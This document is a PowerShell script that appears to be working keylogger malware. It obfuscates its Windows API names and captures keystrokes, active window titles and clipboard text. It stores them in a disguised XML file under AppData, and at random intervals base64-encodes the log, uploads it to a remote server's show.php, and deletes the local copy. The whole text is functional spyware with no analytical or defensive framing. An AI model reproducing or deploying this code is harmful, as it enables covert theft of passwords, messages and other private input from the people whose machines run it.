Function InfoKey {
    Param (
        [string] $ur
    )

    $Script:webReqUpload = $null;
    $Script:boundary = "";
    $Script:upURL = $ur;

	Function InitWebReqSessions {
        $Script:webReqUpload = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
        $Script:webReqUpload.UserAgent = "Mozilla/5.0 (Windows NT 10.x; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chremo/87.0.4280.141 Safari/537.36 Edgo/87.0.664.75";

        $boundaryHex = New-Object byte[] 10;
        for( $ii = 0 ; $ii -lt 10 ; $ii ++ ) {
            $boundaryHex[$ii] = Get-Random -Minimum 0 -Maximum 255;
        }
    
        $Script:boundary = "----" + [Convert]::ToBase64String($boundaryHex);
        $Script:webReqUpload.Headers.Add("Content-Type", "multipart/form-data; boundary=$Script:boundary");
    }

	Function PostUpData {
		param(
			[String] $Name,
			[String] $Data
		)
		InitWebReqSessions
		$enc_UTF8 = New-Object System.Text.UTF8Encoding;        
		$dataBytes = $enc_UTF8.GetBytes($Data);
		$postString = [Convert]::ToBase64String($dataBytes, [Base64FormattingOptions]::InsertLineBreaks);
		if( $postString -ne $null )
		{
			$conDisp = "--$Script:boundary`r`nContent-Disposition: form-data; name=";
			$postData = "$conDisp`"MAX_FILE_SIZE`"`r`n`r`n";
			$postData += "1000000`r`n";
			$postData += "$conDisp`"file`"; filename=`"";
			$postData += $Name + "`"`r`n";
			$postData += "Content-Type: text/plain`r`n`r`n";
			$postData += "$postString`r`n--$Script:boundary--";

			$url = "$Script:upURL/show.php";
			$response = Invoke-WebRequest -Uri $url -WebSession $Script:webReqUpload -Method Post -Body $postData;
		}
	}

	function StartMain{
		Param(
			[Parameter(Mandatory=$True)]
			[string]$Path
		)

		$alias = @('[DllImport("user32.dll",CharSet=CharSet.Auto)]', 'public static extern', 'System.Text.StringBuilder')
		$mClk = @("GetAsyn", "GetKeyboa", "MapVir", "GetForegro", "GetWi", "ToUni", "GetClipb", "IsClipbo", "GetTic")
		
		$mClk1 = @("cKeyState", "rdState", "tualKey", "undWindow", "ndowText", "code", "oardSequenceNumber", "ardFormatAvailable", "kCount")

        for($i = 0; $i -le $mClk.Count; $i++)
        {
            $mClk[$i] = $mClk[$i] + $mClk1[$i];
        }

		$clk = 'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;public class CLK{[DllImport("user32.dll",CharSet=CharSet.Auto,ExactSpelling=true)]' + $alias[1] + ' short ' + $mClk[0] + '(int virtualKeyCode);' + $alias[0] + '' + $alias[1] + ' int ' + $mClk[1] + '(byte[] keystate);' + $alias[0] + '' + $alias[1] + ' int ' + $mClk[2] + '(uint uCode,int uMapType);' + $alias[0] + '' + $alias[1] + ' int ' + $mClk[3] + '();' + $alias[0] + '' + $alias[1] + ' int ' + $mClk[4] + '(int hwnd,' + $alias[2] + ' lpText,int cchLength);' + $alias[0] + '' + $alias[1] + ' int ' + $mClk[5] + '(uint wVirtKey,uint wScanCode,byte[] lpkeystate,' + $alias[2] + ' pwszBuff,int cchBuff,uint wFlags);[DllImport("user32.dll")]' + $alias[1] + ' int ' + $mClk[6] + '();[DllImport("user32.dll")]' + $alias[1] + ' bool ' + $mClk[7] + '(uint uFormat);[DllImport("kernel32.dll")]' + $alias[1] + ' UInt32 ' + $mClk[8] + '();}'
		Add-Type -TypeDefinition $clk 
		Add-Type -Assembly PresentationCore
		$bMute = $true
		$strMute = "Global\AlreadyRunning19122345"
		try{
			$curMute = [System.Threading.Mutex]::OpenExisting($strMute)
			$bMute = $false
		}catch{
			$newMute = New-Object System.Threading.Mutex($true,$strMute)
		}
		$o_clk = [CLK]  
		$o_enc_mode = [System.Text.Encoding]::UTF8
		$a_kb = New-Object Byte[] 256	
		$strBuilder = New-Object -TypeName System.Text.StringBuilder
		$curWnd = New-Object System.Text.StringBuilder(260)

		$a_asc = @(0x09,  0x27,   0x2E,    0x08,   0x24,     0x1b,    0x25,   0x01,   0x20, 0x2d,    0x26,  0x11,     0x28,  0x23,    0x02)
		$a_str = @("Tab", "[->]", "[Del]", "[Bk]", "[Home]", "[Esc]", "[<-]", "[LM]", " ",  "[Ser]", "[^]", "[Ctrl]", "[v]", "[End]", "[RM]")
		$tf = "yyyy/MM/dd`tHH:mm:ss"
		$oldWnd = ""
		$oldTick = 0
		$oldClip = 0
		$upTick = 0
		
		$minTime = 15000000
		$maxTime = 21000000
		$tickGap = Get-Random -Minimum $minTime -Maximum $maxTime	
		while($bMute){
			Start-Sleep -Milliseconds 1
			$curTick = $o_clk::($mClk[8])()
			$aa = (get-date).hour
			if(($upTick -eq 0) -or (($curTick - $upTick) -gt $tickGap)){
					$upTick = $curTick
					$tickGap = Get-Random -Minimum $minTime -Maximum $maxTime
					if( [System.IO.File]::Exists($Path) ) {
						$log = [System.IO.File]::ReadAllText($Path)
						PostUpData -Name "key" -Data $log
						[System.IO.File]::Delete($Path)
					}
				}
			
			$hTopWnd = $o_clk::($mClk[3])()
			$len = $o_clk::($mClk[4])($hTopWnd, $curWnd, $curWnd.Capacity)
			if($curWnd.ToString() -ne $oldWnd){
				$oldWnd = $curWnd.ToString()
				$t = Get-Date -Format $tf
				[System.IO.File]::AppendAllText($Path, "`n----- [" + $t + "] [" + $curWnd.ToString() + "] -----`n", $o_enc_mode)	
			}

			if(($oldTick -eq 0) -or (($curTick - $oldTick) -gt 1000)){
				$oldTick = $curTick
				$curClip = $o_clk::($mClk[6])()
				if($oldClip -ne $curClip){
					$oldClip = $curClip
					if($o_clk::($mClk[7])(1)){
						[System.IO.File]::AppendAllText($Path, "`n----- [Clipboard] -----`n" + [Windows.Clipboard]::GetText() + "`n------------------------------`n", $o_enc_mode)
					}
				}
			}
			
			$k = ""
			for($val = 0; $val -le 254; $val++){
				$vals = -12345 - 20422;
				if($o_clk::($mClk[0])($val) -ne $vals) {continue}			
				$null = [console]::CapsLock		
				$vals = 45 - 14;
				if($val -gt $vals){
					$vKey = $o_clk::($mClk[2])($val, (8 - 5))
					$ret = $o_clk::($mClk[1])($a_kb)
					if($o_clk::($mClk[5])($val, $vKey, $a_kb, $strBuilder, $strBuilder.Capacity, 0) -gt 0){
						$k += $strBuilder.ToString()
					}						
				}else{
					for($i = 0; $i -le (19-5); $i++){
						if($val -eq $a_asc[$i]){
							$k += $a_str[$i]
							break
						}
					}
				}					
			}
			if($k.Length -gt 0){
				[System.IO.File]::AppendAllText($Path, $k, $o_enc_mode)
			}
		}
	}
	
	StartMain -Path "$env:appdata\Microsoft\Windows\Templates\Pages_Elements.xml"
}
